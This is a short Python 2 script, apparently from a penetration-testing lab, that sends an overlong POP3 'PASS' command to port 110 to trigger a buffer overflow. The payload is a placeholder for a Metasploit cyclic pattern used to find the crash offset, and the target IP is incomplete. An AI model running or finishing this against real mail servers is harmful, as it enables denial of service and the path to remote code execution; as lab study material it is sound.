import socket
import sys

rhost = "192.168"
rport = 110

payload = ""
payload += "PASS "
# msf-pattern_create -l 3000
payload += "<enter unique string here>"
payload += "\r\n"

try:
	print "Overflowing with %s bytes..." % len(payload)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.recv(1024)
	s.send("QUIT")
	s.close()
except:
	print "Oops! Something went wrong!"
	sys.exit()

	